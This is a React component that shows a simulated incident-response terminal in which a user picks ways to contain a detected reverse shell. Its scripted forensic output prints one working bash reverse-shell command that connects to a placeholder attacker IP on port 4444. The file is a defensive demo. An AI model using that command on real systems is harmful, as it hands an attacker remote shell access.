import React, { useState, useEffect, useRef } from 'react';
import { useSystemContext } from './state';
import { BespokeScriptIcon, Icon } from './Icon';

export function LiveSocScriptModal() {
  const s = useSystemContext();
  const [logs, setLogs] = useState<string[]>([
    '[*] Initializing live_soc_alert.sh [Tactical Incident Response Automation]...',
    '[*] Kernel hooks active (eBPF probe attached to eth0 ingress/egress)',
    '[!] ALERT TRIGGERED: High-frequency outbound beaconing from 192.168.1.105 -> 203.0.113.42:4444',
    '[!] Parent Process: /usr/sbin/apache2 -> Child Process: /bin/sh (PID: 4912)',
    '[!] Suspected Reverse Shell Established · MITRE ATT&CK: T1059.004 (Unix Shell)',
    '',
    '[?] SELECT TACTICAL INCIDENT RESPONSE ACTION:',
    '  [1] Isolate Host via eBPF XDP kernel filter',
    '  [2] Dump Process RAM & Extract Memory Artifacts (Volatility/LiME)',
    '  [3] Inject nftables C2 Blackhole & Revoke Ephemeral Workload Token',
    ''
  ]);

  const [inputVal, setInputVal] = useState('');
  const [neutralized, setNeutralized] = useState(false);
  const logRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    logRef.current?.scrollTo({ top: logRef.current.scrollHeight, behavior: 'smooth' });
  }, [logs]);

  const handleAction = (option: number) => {
    if (neutralized) return;
    if (option === 1) {
      setLogs(prev => [
        ...prev,
        '> [USER]: Option 1 — Isolate Host via eBPF XDP',
        '[*] Attaching XDP bytecode to eth0: dropping all non-management ingress/egress for 192.168.1.105...',
        '[+] eBPF program loaded: 192.168.1.105 isolated in 0.04ms.',
        '[+] Lateral movement vectors severed.',
        ''
      ]);
      setNeutralized(true);
      s.notify('Host isolated via in-kernel XDP filter.');
    } else if (option === 2) {
      setLogs(prev => [
        ...prev,
        '> [USER]: Option 2 — Dump Process RAM & Volatility analysis',
        '[*] Taking snapshot of PID 4912 memory space via LiME kernel module...',
        '[+] Extracted command line: "/bin/sh -i >& /dev/tcp/203.0.113.42/4444 0>&1"',
        '[+] In-memory artifacts preserved in /var/log/forensics/dump_4912.lime',
        ''
      ]);
      setNeutralized(true);
      s.notify('Process memory dumped and forensic artifacts secured.');
    } else if (option === 3) {
      setLogs(prev => [
        ...prev,
        '> [USER]: Option 3 — nftables C2 Blackhole & Token Revocation',
        '[*] Injecting nftables rule: drop ip daddr 203.0.113.42',
        '[*] Invalidating JWT authentication session for web-worker-01...',
        '[+] C2 communication channel completely blocked.',
        '[+] Stolen credentials revoked across OAuth broker.',
        ''
      ]);
      setNeutralized(true);
      s.notify('C2 destination blackholed and token revoked.');
    }
  };

  const handleReset = () => {
    setNeutralized(false);
    setLogs([
      '[*] Restarting live_soc_alert.sh...',
      '[*] Kernel hooks re-attached to network interfaces',
      '[!] ALERT TRIGGERED: Outbound beaconing from 192.168.1.105 -> 203.0.113.42:4444',
      '[!] Suspected Reverse Shell (PID: 4912)',
      '',
      '[?] SELECT TACTICAL INCIDENT RESPONSE ACTION:',
      '  [1] Isolate Host via eBPF XDP kernel filter',
      '  [2] Dump Process RAM & Extract Memory Artifacts',
      '  [3] Inject nftables C2 Blackhole & Revoke Token',
      ''
    ]);
  };

  return (
    <div className="script-modal-stage app-scroll">
      {/* Header */}
      <header className="script-modal-header">
        <div className="script-title-row">
          <div className="script-icon-badge">
            <BespokeScriptIcon size={32} />
          </div>
          <div>
            <h1>live_soc_alert.sh [Interactive Shell Runner]</h1>
            <p>Simulated Bash Automation · Real-time Incident Triage & In-Kernel Containment</p>
          </div>
        </div>

        <div className="script-actions">
          {neutralized && (
            <button className="tactical-pill-btn" onClick={handleReset}>
              <Icon name="close" size={14} />
              <span>Re-Run Script ↺</span>
            </button>
          )}
          <button className="tactical-pill-btn primary" onClick={() => s.open('defense')}>
            <Icon name="shield" size={14} />
            <span>Open Cyber Defense Lab</span>
          </button>
        </div>
      </header>

      {/* Terminal View */}
      <div className="script-terminal-window">
        <div className="script-terminal-bar">
          <span className="terminal-title">zsh — root@kali: ~/scripts/live_soc_alert.sh</span>
          <span className={`terminal-indicator ${neutralized ? 'contained' : 'active'}`}>
            {neutralized ? '● THREAT NEUTRALIZED' : '● ACTIVE INCIDENT DETECTED'}
          </span>
        </div>

        <div className="script-terminal-body" ref={logRef}>
          {logs.map((l, i) => (
            <pre key={i} className={`script-log-line ${l.startsWith('[!]') ? 'alert' : l.startsWith('[+]') ? 'success' : l.startsWith('>') ? 'user' : ''}`}>
              {l}
            </pre>
          ))}

          {neutralized && (
            <div className="containment-success-card">
              <div className="success-banner">
                <span className="check-glyph">✓</span>
                <div>
                  <strong>INCIDENT CONTAINED BY OPERATOR ZAKARYA OUKIL</strong>
                  <p>Attacking C2 infrastructure neutralized. Telemetry and memory captures stored for post-incident review.</p>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Action Controls */}
        <div className="script-controls-bar">
          {!neutralized ? (
            <div className="script-button-row">
              <button onClick={() => handleAction(1)} className="script-action-btn">
                <span>[1]</span> Isolate Host (eBPF XDP)
              </button>
              <button onClick={() => handleAction(2)} className="script-action-btn">
                <span>[2]</span> Dump Memory (LiME)
              </button>
              <button onClick={() => handleAction(3)} className="script-action-btn">
                <span>[3]</span> Block C2 IP & Revoke Token
              </button>
            </div>
          ) : (
            <div className="script-done-row">
              <span>Execution finished with exit code 0. Threat mitigated.</span>
              <button onClick={handleReset} className="re-execute-btn">Re-trigger incident</button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
